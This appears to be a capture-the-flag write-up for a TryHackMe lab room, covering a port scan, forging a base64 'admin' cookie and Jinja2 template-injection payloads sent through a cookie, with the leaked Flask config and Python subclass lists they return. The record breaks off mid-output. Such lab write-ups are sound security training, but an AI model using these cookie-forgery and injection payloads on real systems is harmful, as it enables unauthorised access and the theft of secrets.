---
The dwarves are hiding their gold!
---

![|111](https://tryhackme-images.s3.amazonaws.com/room-icons/478e13a9419b3514396915e4e07211fb.png)

### Infiltrate the Forge 


Can you overcome the forge and steal all of the gold!
Disclaimer

Writeups will be reviewed 4 weeks after the release of the room.

```
┌──(kali㉿kali)-[~/scripting]
└─$ rustscan -a 10.10.30.23 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.30.23:22
Open 10.10.30.23:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-26 15:18 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 0.00s elapsed
Initiating Ping Scan at 15:18
Scanning 10.10.30.23 [2 ports]
Completed Ping Scan at 15:18, 0.31s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:18
Completed Parallel DNS resolution of 1 host. at 15:18, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:18
Scanning 10.10.30.23 [2 ports]
Discovered open port 22/tcp on 10.10.30.23
Discovered open port 80/tcp on 10.10.30.23
Completed Connect Scan at 15:18, 0.31s elapsed (2 total ports)
Initiating Service scan at 15:18
Scanning 2 services on 10.10.30.23
Completed Service scan at 15:18, 6.64s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.30.23.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 8.76s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 1.25s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 0.00s elapsed
Nmap scan report for 10.10.30.23
Host is up, received syn-ack (0.31s latency).
Scanned at 2022-10-26 15:18:13 EDT for 17s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d823243c6e3f5bb0ec42e4ce712f1e52 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1ElGI0HLd8mhCV1HC0Mdnml4FZPMr17SrcABm6GMKV0g5e4wQNtSPAvXhGj696aoKgVX1jDbe4DzDGr3jDkLjXegnpqQyVQnSYV7Cz9pON4b9cplT/OPK/7cd96E7tKFsZ3F+eOM51Vm6KeYUbZG0DnHZIB7kmPAH+ongqQmpG8Of/wXNgR4ONc6dD/lTYWCgWeCEYT0ERlErkqM05mO9DwV+7Lr+AZhAZ8afx+NSpV17gBZzjmqT4my3zMAf3Ne0VY/exvb807YKiHmPPaieE8KxjfRjcsHGsMuYesDm3m0cUvGSdp2xfu8J5dOSNJc5cVse6RBTPmPu4giRtm+v
|   256 c675e510b40a51833e55b4f603b50b7a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBETP4uMiwXXjEW/UWp1IE/XvhxASBN753PiuZmLz6QiSZE3y5sIHpMtXA3Sss4bZh4DR3hoP3OhXgJmjCJaSS4=
|   256 4c5180db314c6abebf9b48b5d4d6ff7c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJVgfo2NhVXDfelQtZw0p6JWJLPk2/1NF3KRImlYIIul
80/tcp open  http    syn-ack Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title:  Home page 
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
| http-cookie-flags: 
|   /: 
|     session: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:18
Completed NSE at 15:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 


from cookies

┌──(kali㉿kali)-[~/scripting]
└─$ echo 'Z3Vlc3Q=' | base64 -d           
guest        

encoding admin to change in cookies

┌──(kali㉿kali)-[~/scripting]
└─$ echo -n admin | base64     
YWRtaW4=

now have sales cookies

┌──(kali㉿kali)-[~/scripting]
└─$ echo 'JDIsMTY1' | base64 -d
$2,165    

now change sales to admin cookies
YWRtaW4=

and get Current user - admin 

https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

using ssti in flask

{{ config.items() }}

encoded url b64 with cyberchef and use in sales'cookies to get info

JTdCJTdCJTIwY29uZmlnLml0ZW1zKCklMjAlN0QlN0Q=

or just without url encode

┌──(kali㉿kali)-[~/keldagrim]
└─$ echo -n "{{config.items()}}" | base64
e3tjb25maWcuaXRlbXMoKX19


Current user - dict_items([(&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SECRET_KEY&#39;, &#39;If_only_this_was_a_flag&#39;), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(31)), (&#39;USE_X_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), (&#39;SESSION_COOKIE_DOMAIN&#39;, False), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, datetime.timedelta(0, 43200)), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;JSON_AS_ASCII&#39;, True), (&#39;JSON_SORT_KEYS&#39;, True), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;MAX_COOKIE_SIZE&#39;, 4093)]) 

now

{{config.from_object('os')}}

JTdCJTdCJTIwY29uZmlnLmZyb21fb2JqZWN0KCdvcycpJTIwJTdEJTdE

or just without url encode
┌──(kali㉿kali)-[~/keldagrim]
└─$ echo -n "{{config.from_object('os')}}" | base64
e3tjb25maWcuZnJvbV9vYmplY3QoJ29zJyl9fQ==

Current user - None 

again in sales JTdCJTdCJTIwY29uZmlnLmZyb21fb2JqZWN0KCdvcycpJTIwJTdEJTdE

Current user - dict_items([(&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SECRET_KEY&#39;, &#39;If_only_this_was_a_flag&#39;), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(31)), (&#39;USE_X_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), (&#39;SESSION_COOKIE_DOMAIN&#39;, False), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, datetime.timedelta(0, 43200)), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;JSON_AS_ASCII&#39;, True), (&#39;JSON_SORT_KEYS&#39;, True), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;MAX_COOKIE_SIZE&#39;, 4093), (&#39;CLD_CONTINUED&#39;, 6), (&#39;CLD_DUMPED&#39;, 3), (&#39;CLD_EXITED&#39;, 1), (&#39;CLD_TRAPPED&#39;, 4), (&#39;EX_CANTCREAT&#39;, 73), (&#39;EX_CONFIG&#39;, 78), (&#39;EX_DATAERR&#39;, 65), (&#39;EX_IOERR&#39;, 74), (&#39;EX_NOHOST&#39;, 68), (&#39;EX_NOINPUT&#39;, 66), (&#39;EX_NOPERM&#39;, 77), (&#39;EX_NOUSER&#39;, 67), (&#39;EX_OK&#39;, 0), (&#39;EX_OSERR&#39;, 71), (&#39;EX_OSFILE&#39;, 72), (&#39;EX_PROTOCOL&#39;, 76), (&#39;EX_SOFTWARE&#39;, 70), (&#39;EX_TEMPFAIL&#39;, 75), (&#39;EX_UNAVAILABLE&#39;, 69), (&#39;EX_USAGE&#39;, 64), (&#39;F_LOCK&#39;, 1), (&#39;F_OK&#39;, 0), (&#39;F_TEST&#39;, 3), (&#39;F_TLOCK&#39;, 2), (&#39;F_ULOCK&#39;, 0), (&#39;GRND_NONBLOCK&#39;, 1), (&#39;GRND_RANDOM&#39;, 2), (&#39;NGROUPS_MAX&#39;, 65536), (&#39;O_ACCMODE&#39;, 3), (&#39;O_APPEND&#39;, 1024), (&#39;O_ASYNC&#39;, 8192), (&#39;O_CLOEXEC&#39;, 524288), (&#39;O_CREAT&#39;, 64), (&#39;O_DIRECT&#39;, 16384), (&#39;O_DIRECTORY&#39;, 65536), (&#39;O_DSYNC&#39;, 4096), (&#39;O_EXCL&#39;, 128), (&#39;O_LARGEFILE&#39;, 0), (&#39;O_NDELAY&#39;, 2048), (&#39;O_NOATIME&#39;, 262144), (&#39;O_NOCTTY&#39;, 256), (&#39;O_NOFOLLOW&#39;, 131072), (&#39;O_NONBLOCK&#39;, 2048), (&#39;O_PATH&#39;, 2097152), (&#39;O_RDONLY&#39;, 0), (&#39;O_RDWR&#39;, 2), (&#39;O_RSYNC&#39;, 1052672), (&#39;O_SYNC&#39;, 1052672), (&#39;O_TMPFILE&#39;, 4259840), (&#39;O_TRUNC&#39;, 512), (&#39;O_WRONLY&#39;, 1), (&#39;POSIX_FADV_DONTNEED&#39;, 4), (&#39;POSIX_FADV_NOREUSE&#39;, 5), (&#39;POSIX_FADV_NORMAL&#39;, 0), (&#39;POSIX_FADV_RANDOM&#39;, 1), (&#39;POSIX_FADV_SEQUENTIAL&#39;, 2), (&#39;POSIX_FADV_WILLNEED&#39;, 3), (&#39;PRIO_PGRP&#39;, 1), (&#39;PRIO_PROCESS&#39;, 0), (&#39;PRIO_USER&#39;, 2), (&#39;P_ALL&#39;, 0), (&#39;P_NOWAIT&#39;, 1), (&#39;P_NOWAITO&#39;, 1), (&#39;P_PGID&#39;, 2), (&#39;P_PID&#39;, 1), (&#39;P_WAIT&#39;, 0), (&#39;RTLD_DEEPBIND&#39;, 8), (&#39;RTLD_GLOBAL&#39;, 256), (&#39;RTLD_LAZY&#39;, 1), (&#39;RTLD_LOCAL&#39;, 0), (&#39;RTLD_NODELETE&#39;, 4096), (&#39;RTLD_NOLOAD&#39;, 4), (&#39;RTLD_NOW&#39;, 2), (&#39;R_OK&#39;, 4), (&#39;SCHED_BATCH&#39;, 3), (&#39;SCHED_FIFO&#39;, 1), (&#39;SCHED_IDLE&#39;, 5), (&#39;SCHED_OTHER&#39;, 0), (&#39;SCHED_RESET_ON_FORK&#39;, 1073741824), (&#39;SCHED_RR&#39;, 2), (&#39;SEEK_CUR&#39;, 1), (&#39;SEEK_DATA&#39;, 3), (&#39;SEEK_END&#39;, 2), (&#39;SEEK_HOLE&#39;, 4), (&#39;SEEK_SET&#39;, 0), (&#39;ST_APPEND&#39;, 256), (&#39;ST_MANDLOCK&#39;, 64), (&#39;ST_NOATIME&#39;, 1024), (&#39;ST_NODEV&#39;, 4), (&#39;ST_NODIRATIME&#39;, 2048), (&#39;ST_NOEXEC&#39;, 8), (&#39;ST_NOSUID&#39;, 2), (&#39;ST_RDONLY&#39;, 1), (&#39;ST_RELATIME&#39;, 4096), (&#39;ST_SYNCHRONOUS&#39;, 16), (&#39;ST_WRITE&#39;, 128), (&#39;TMP_MAX&#39;, 238328), (&#39;WCONTINUED&#39;, 8), (&#39;WCOREDUMP&#39;, &lt;built-in function WCOREDUMP&gt;), (&#39;WEXITED&#39;, 4), (&#39;WEXITSTATUS&#39;, &lt;built-in function WEXITSTATUS&gt;), (&#39;WIFCONTINUED&#39;, &lt;built-in function WIFCONTINUED&gt;), (&#39;WIFEXITED&#39;, &lt;built-in function WIFEXITED&gt;), (&#39;WIFSIGNALED&#39;, &lt;built-in function WIFSIGNALED&gt;), (&#39;WIFSTOPPED&#39;, &lt;built-in function WIFSTOPPED&gt;), (&#39;WNOHANG&#39;, 1), (&#39;WNOWAIT&#39;, 16777216), (&#39;WSTOPPED&#39;, 2), (&#39;WSTOPSIG&#39;, &lt;built-in function WSTOPSIG&gt;), (&#39;WTERMSIG&#39;, &lt;built-in function WTERMSIG&gt;), (&#39;WUNTRACED&#39;, 2), (&#39;W_OK&#39;, 2), (&#39;XATTR_CREATE&#39;, 1), (&#39;XATTR_REPLACE&#39;, 2), (&#39;XATTR_SIZE_MAX&#39;, 65536), (&#39;X_OK&#39;, 1)])' 

now {{ ''.__class__.__mro__[1].__subclasses__() }}

JTdCJTdCJTIwJycuX19jbGFzc19fLl9fbXJvX18lNUIxJTVELl9fc3ViY2xhc3Nlc19fKCklMjAlN0QlN0Q=

or just without url encode

┌──(kali㉿kali)-[~/keldagrim]
└─$ echo -n "{{''.__class__.__mro__[1].__subclasses__()}}" | base64 
e3snJy5fX2NsYXNzX18uX19tcm9fX1sxXS5fX3N1YmNsYXNzZXNfXygpfX0=


Current user - [&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;weakref.finalize._Info&#39;&gt;, &lt;class &#39;weakref.finalize&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;enum.auto&#39;&gt;, &lt;enum &#39;Enum&#39;&gt;, &lt;class &#39;_sre.SRE_Pattern&#39;&gt;, &lt;class &#39;_sre.SRE_Match&#39;&gt;, &lt;class &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;sre_parse.Pattern&#39;&gt;, &lt;class &#39;sre_parse.SubPattern&#39;&gt;, &lt;class &#39;sre_parse.Tokenizer&#39;&gt;, &lt;class &#39;re.Scanner&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;class &#39;markupsafe._MarkupEscapeHelper&#39;&gt;, &lt;class &#39;zlib.Compress&#39;&gt;, &lt;class &#39;zlib.Decompress&#39;&gt;, &lt;class &#39;tokenize.Untokenizer&#39;&gt;, &lt;class &#39;traceback.FrameSummary&#39;&gt;, &lt;class &#39;traceback.TracebackException&#39;&gt;, &lt;class &#39;threading._RLock&#39;&gt;, &lt;class &#39;threading.Condition&#39;&gt;, &lt;class &#39;threading.Semaphore&#39;&gt;, &lt;class &#39;threading.Event&#39;&gt;, &lt;class &#39;threading.Barrier&#39;&gt;, &lt;class &#39;threading.Thread&#39;&gt;, &lt;class &#39;_bz2.BZ2Compressor&#39;&gt;, &lt;class &#39;_bz2.BZ2Decompressor&#39;&gt;, &lt;class &#39;_lzma.LZMACompressor&#39;&gt;, &lt;class &#39;_lzma.LZMADecompressor&#39;&gt;, &lt;class &#39;_hashlib.HASH&#39;&gt;, &lt;class &#39;_blake2.blake2b&#39;&gt;, &lt;class &#39;_blake2.blake2s&#39;&gt;, &lt;class &#39;_sha3.sha3_224&#39;&gt;, &lt;class &#39;_sha3.sha3_256&#39;&gt;, &lt;class &#39;_sha3.sha3_384&#39;&gt;, &lt;class &#39;_sha3.sha3_512&#39;&gt;, &lt;class &#39;_sha3.shake_128&#39;&gt;, &lt;class &#39;_sha3.shake_256&#39;&gt;, &lt;class &#39;_random.Random&#39;&gt;, &lt;class &#39;tempfile._RandomNameSequence&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileCloser&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileWrapper&#39;&gt;, &lt;class &#39;tempfile.SpooledTemporaryFile&#39;&gt;, &lt;class &#39;tempfile.TemporaryDirectory&#39;&gt;, &lt;class &#39;Struct&#39;&gt;, &lt;class &#39;pickle._Framer&#39;&gt;, &lt;class &#39;pickle._Unframer&#39;&gt;, &lt;class &#39;pickle._Pickler&#39;&gt;, &lt;class &#39;pickle._Unpickler&#39;&gt;, &lt;class &#39;_pickle.Unpickler&#39;&gt;, &lt;class &#39;_pickle.Pickler&#39;&gt;, &lt;class &#39;_pickle.Pdata&#39;&gt;, &lt;class &#39;_pickle.PicklerMemoProxy&#39;&gt;, &lt;class &#39;_pickle.UnpicklerMemoProxy&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinStr&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinBytes&#39;&gt;, &lt;class &#39;urllib.parse._NetlocResultMixinBase&#39;&gt;, &lt;class &#39;_json.Scanner&#39;&gt;, &lt;class &#39;_json.Encoder&#39;&gt;, &lt;class &#39;json.decoder.JSONDecoder&#39;&gt;, &lt;class &#39;json.encoder.JSONEncoder&#39;&gt;, &lt;class &#39;jinja2.utils.MissingType&#39;&gt;, &lt;class &#39;jinja2.utils.LRUCache&#39;&gt;, &lt;class &#39;jinja2.utils.Cycler&#39;&gt;, &lt;class &#39;jinja2.utils.Joiner&#39;&gt;, &lt;class &#39;jinja2.utils.Namespace&#39;&gt;, &lt;class &#39;jinja2.bccache.Bucket&#39;&gt;, &lt;class &#39;jinja2.bccache.BytecodeCache&#39;&gt;, &lt;class &#39;jinja2.nodes.EvalContext&#39;&gt;, &lt;class &#39;jinja2.nodes.Node&#39;&gt;, &lt;class &#39;jinja2.visitor.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.idtracking.Symbols&#39;&gt;, &lt;class &#39;__future__._Feature&#39;&gt;, &lt;class &#39;jinja2.compiler.MacroRef&#39;&gt;, &lt;class &#39;jinja2.compiler.Frame&#39;&gt;, &lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;, &lt;class &#39;jinja2.runtime.Context&#39;&gt;, &lt;class &#39;jinja2.runtime.BlockReference&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContext&#39;&gt;, &lt;class &#39;jinja2.runtime.Macro&#39;&gt;, &lt;class &#39;jinja2.runtime.Undefined&#39;&gt;, &lt;class &#39;decimal.Decimal&#39;&gt;, &lt;class &#39;decimal.Context&#39;&gt;, &lt;class &#39;decimal.SignalDictMixin&#39;&gt;, &lt;class &#39;decimal.ContextManager&#39;&gt;, &lt;class &#39;numbers.Number&#39;&gt;, &lt;class &#39;_ast.AST&#39;&gt;, &lt;class &#39;ast.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.lexer.Failure&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStreamIterator&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStream&#39;&gt;, &lt;class &#39;jinja2.lexer.Lexer&#39;&gt;, &lt;class &#39;jinja2.parser.Parser&#39;&gt;, &lt;class &#39;jinja2.environment.Environment&#39;&gt;, &lt;class &#39;jinja2.environment.Template&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateModule&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateExpression&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateStream&#39;&gt;, &lt;class &#39;jinja2.loaders.BaseLoader&#39;&gt;, &lt;class &#39;select.poll&#39;&gt;, &lt;class &#39;select.epoll&#39;&gt;, &lt;class &#39;selectors.BaseSelector&#39;&gt;, &lt;class &#39;_socket.socket&#39;&gt;, &lt;class &#39;datetime.date&#39;&gt;, &lt;class &#39;datetime.timedelta&#39;&gt;, &lt;class &#39;datetime.time&#39;&gt;, &lt;class &#39;datetime.tzinfo&#39;&gt;, &lt;class 